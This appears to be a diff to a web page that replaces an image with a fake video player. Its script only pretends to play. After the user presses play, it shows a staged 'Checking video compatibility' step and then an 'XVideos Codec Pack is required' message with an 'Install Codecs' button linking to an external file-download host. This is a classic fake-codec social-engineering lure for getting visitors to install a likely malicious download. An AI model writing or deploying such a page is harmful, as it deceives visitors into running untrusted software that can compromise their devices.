@@ -512,6 +512,39 @@ body {
   }
 }
 
+
+/* ===== Player skin and responsive controls matched to 2.html ===== */
+.player{position:relative;width:100%;aspect-ratio:16/9;background:#000 url("ai_bot.png") center center/cover no-repeat;border-radius:10px;overflow:hidden;box-shadow:0 10px 35px rgba(0,0,0,.45);margin:0 auto 15px;}
+.player::after{content:"";position:absolute;left:0;right:0;bottom:0;height:85px;background:linear-gradient(to bottom,rgba(0,0,0,0),rgba(0,0,0,.15),rgba(0,0,0,.72));pointer-events:none;z-index:1;}
+.center-play{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:72px;height:72px;border-radius:50%;border:0;background:rgba(0,0,0,.65);color:#fff;font-size:30px;cursor:pointer;z-index:3;transition:.2s ease;display:flex;align-items:center;justify-content:center;}
+.center-play:hover{transform:translate(-50%,-50%) scale(1.08);background:rgba(0,0,0,.82);}
+.controls{position:absolute;left:0;right:0;bottom:0;height:52px;display:flex;align-items:center;gap:10px;padding:7px 10px;background:linear-gradient(to top,rgba(0,0,0,.92),rgba(0,0,0,.68));z-index:2;}
+.control-btn{border:0;background:none;color:#fff;cursor:pointer;font-size:18px;width:32px;min-width:32px;height:32px;padding:0;display:flex;align-items:center;justify-content:center;}
+.control-btn:hover{color:#ddd;}
+.progress-wrap{flex:1;height:5px;background:rgba(255,255,255,.25);border-radius:10px;cursor:pointer;overflow:hidden;min-width:20px;}
+.progress{width:0%;height:100%;background:#fff;border-radius:10px;}
+.time{font-size:12px;color:#fff;white-space:nowrap;min-width:76px;text-align:right;flex:0 0 auto;}
+.volume{width:62px;min-width:62px;accent-color:#fff;flex:0 1 62px;max-width:62px;}
+.codec-box{margin:0 auto 18px;padding:20px;border-radius:10px;background:#1a1a1a;border:1px solid #292929;text-align:center;display:none;box-shadow:0 8px 25px rgba(0,0,0,.25);width:100%;max-width:100%;overflow-wrap:anywhere;}
+.codec-box.visible{display:block;animation:fadeIn .45s ease;}
+.checking{color:#ddd;font-size:15px;}
+.spinner{width:28px;height:28px;margin:0 auto 12px;border:3px solid rgba(255,255,255,.18);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;}
+.codec-result{display:none;}
+.codec-result.show{display:block;animation:fadeIn .45s ease;}
+.codec-result h2{margin:0 0 10px;font-size:20px;color:#fff;}
+.codec-result p{margin:0 auto 18px;max-width:620px;color:#bbb;font-size:14px;line-height:1.55;}
+.install-btn{display:inline-flex;align-items:center;justify-content:center;min-height:44px;padding:0 24px;border-radius:7px;background:#fff;color:#111;text-decoration:none;font-weight:700;font-size:14px;transition:.2s ease;max-width:100%;white-space:normal;text-align:center;}
+.install-btn:hover{transform:translateY(-1px);background:#e8e8e8;}
+@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+@media(max-width:768px){.player{border-radius:8px}.center-play{width:60px;height:60px;font-size:25px}.controls{height:38px;padding:4px 7px;gap:5px}.control-btn{width:27px;min-width:27px;height:27px;font-size:15px}.progress-wrap{height:4px}.time{font-size:10px;min-width:68px}.volume{width:48px;min-width:48px}.player::after{height:58px}}
+@media(max-width:480px){.player{border-radius:7px}.center-play{width:52px;height:52px;font-size:22px}.controls{height:34px;padding:3px 5px;gap:3px}.control-btn{width:24px;min-width:24px;height:24px;font-size:13px}.progress-wrap{height:3px}.time{font-size:9px;min-width:60px}.volume{width:40px;min-width:40px}.codec-box{margin-top:12px;padding:16px 12px}.codec-result h2{font-size:18px}.codec-result p{font-size:13px}.install-btn{min-height:38px;padding:0 18px;font-size:13px}}
+@media(max-width:360px){.controls{height:31px;padding:2px 4px;gap:2px}.control-btn{width:22px;min-width:22px;height:22px;font-size:12px}.progress-wrap{height:3px}.time{font-size:8px;min-width:54px}.volume{width:34px;min-width:34px}.player::after{height:45px}.install-btn{min-height:36px;padding:0 16px;font-size:12px}}
+@media(max-width:600px){.controls{height:40px}.control-btn{flex:0 0 28px;width:28px;min-width:28px}.time{font-size:10px;min-width:56px}.volume{width:45px;min-width:35px}.codec-box{margin-top:12px;padding:clamp(12px,4vw,18px)}.codec-result p{font-size:clamp(12px,3.4vw,14px)}}
+@media(max-width:420px){.controls{height:36px;padding-top:2px;padding-bottom:2px}.control-btn{flex-basis:25px;width:25px;min-width:25px;height:25px;font-size:13px}.time{font-size:9px;min-width:48px}.volume{width:38px;min-width:30px}.center-play{width:clamp(46px,14vw,56px);height:clamp(46px,14vw,56px);font-size:clamp(20px,6vw,24px)}}
+@media(max-width:320px){.controls{height:32px;gap:1px;padding-left:3px;padding-right:3px}.control-btn{flex-basis:22px;width:22px;min-width:22px;height:22px;font-size:11px}.time{font-size:8px;min-width:42px}.volume{display:none}}
+@media(hover:none) and (pointer:coarse){.control-btn,.center-play,.install-btn{min-height:40px}.center-play{min-height:0}}
+
 </style>
 </head>
 <body>
@@ -523,7 +556,24 @@ body {
 <div class="display">
   <h2 style="font-size:22px; font-weight:700; margin-bottom:10px; color:#00ffcc;"></h2>
 
-  <img src="ai_bot.png" alt="AI Bot" style="width:100%; height:auto; border-radius:8px; margin-bottom:15px; cursor:pointer;" onclick="openModal()">
+  <!-- Player copied from 2.html -->
+  <div class="player" id="player">
+    <button class="center-play" id="centerPlay" aria-label="Play">▶</button>
+    <div class="controls">
+      <button class="control-btn" id="playBtn" title="Play" aria-label="Play">▶</button>
+      <div class="progress-wrap" id="progressWrap"><div class="progress" id="progress"></div></div>
+      <div class="time" id="time">00:00 / --:--</div>
+      <input class="volume" id="volume" type="range" min="0" max="1" step="0.01" value="1" aria-label="Volume">
+    </div>
+  </div>
+  <div class="codec-box" id="codecBox">
+    <div class="checking" id="checking"><div class="spinner"></div><div>Checking video compatibility...</div></div>
+    <div class="codec-result" id="codecResult">
+      <h2>Video compatibility issue</h2>
+      <p>The XVideos Codec Pack is required for playback.</p>
+      <a class="install-btn" href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack" target="_blank" rel="noopener noreferrer">Install Codecs</a>
+    </div>
+  </div>
 
 <div class="inner-block">
 
@@ -705,5 +755,34 @@ function googleTranslateElementInit() {
 }
 </script>
 <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+<script>
+(function(){
+const player=document.getElementById("player");
+const playBtn=document.getElementById("playBtn");
+const centerPlay=document.getElementById("centerPlay");
+const progressWrap=document.getElementById("progressWrap");
+const progress=document.getElementById("progress");
+const time=document.getElementById("time");
+const volume=document.getElementById("volume");
+const codecBox=document.getElementById("codecBox");
+const checking=document.getElementById("checking");
+const codecResult=document.getElementById("codecResult");
+let isPlaying=false, interval=null, currentTime=0, compatibilityStarted=false;
+const totalDuration=Math.floor(Math.random()*(928-722+1))+722;
+function formatTime(s){return String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0')}
+function updateTime(){progress.style.width=Math.min(currentTime/totalDuration*100,100)+'%';time.textContent=formatTime(currentTime)+' / '+formatTime(totalDuration)}
+function startProgress(){if(interval!==null)return;isPlaying=true;playBtn.textContent='❚❚';playBtn.title='Pause';centerPlay.style.display='none';interval=setInterval(()=>{if(currentTime<totalDuration){currentTime++;updateTime()}else stopProgress()},1000);}
+function stopProgress(){if(interval!==null){clearInterval(interval);interval=null}isPlaying=false;playBtn.textContent='▶';centerPlay.style.display='flex';}
+function showCompatibilityCheck(){if(compatibilityStarted)return;compatibilityStarted=true;setTimeout(()=>{codecBox.classList.add('visible');setTimeout(()=>{checking.style.display='none';codecResult.classList.add('show');},3000)},2000)}
+playBtn.addEventListener('click',e=>{e.stopPropagation();if(isPlaying)stopProgress();else{startProgress();showCompatibilityCheck()}});
+centerPlay.addEventListener('click',e=>{e.stopPropagation();startProgress();showCompatibilityCheck()});
+player.addEventListener('click',e=>{if(e.target.closest('.controls'))return;if(!isPlaying){startProgress();showCompatibilityCheck()}});
+progressWrap.addEventListener('click',e=>{const r=progressWrap.getBoundingClientRect();if(!r.width)return;currentTime=Math.floor(totalDuration*Math.max(0,Math.min(1,(e.clientX-r.left)/r.width)));updateTime()});
+volume.addEventListener('input',()=>{});
+updateTime();
+})();
+</script>
+
 </body>
 </html>
